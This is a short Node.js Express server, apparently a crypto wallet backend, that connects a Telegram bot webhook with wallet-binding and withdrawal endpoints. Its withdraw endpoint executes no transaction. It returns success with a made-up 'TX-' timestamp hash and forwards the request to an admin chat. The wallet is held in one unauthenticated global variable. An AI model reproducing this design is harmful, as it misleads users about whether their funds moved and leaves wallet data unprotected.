import express from "express";
import path from "path";
import { Telegraf } from "telegraf";
import cors from "cors";

const app = express();
app.use(cors());
app.use(express.json());

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const WEBHOOK_URL = process.env.WEBHOOK_URL;

const bot = new Telegraf(BOT_TOKEN);

// ==== 必须关闭 polling，否则 Telegram 409 错误 ====
bot.stop();

// ==== 正确启用 Webhook 模式 ====
await bot.telegram.setWebhook(`${WEBHOOK_URL}/telegraf`);

// Express 处理 Telegram Webhook
app.use(bot.webhookCallback("/telegraf"));

// ====== API: 钱包绑定 ======
let userwallet = null;

app.get("/api/wallet", (req, res) => {
    res.json({ wallet: userwallet });
});

app.post("/api/wallet", (req, res) => {
    const { wallet } = req.body;

    if (!wallet) return res.status(400).json({ success: false, error: "Wallet required" });

    userwallet = wallet;
    return res.json({ success: true, wallet });
});

// ====== API: 提现 ======
app.post("/api/withdraw", async (req, res) => {
    const { amount, wallet, coin } = req.body;

    const hash = "TX-" + Date.now();

    await bot.telegram.sendMessage(
        ADMIN_CHAT_ID,
        `💸 Withdrawal Request\nCoin：${coin}\nAmount：${amount}\nWallet：${wallet}\nTxHash：${hash}`
    );

    res.json({ success: true, hash });
});

// ====== 静态网页 ======
const __dirname = path.resolve();
app.use(express.static(path.join(__dirname, "public")));

app.get("*", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "index.html"));
});

// ====== 启动服务 ======
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("🚀 Server running on", PORT));
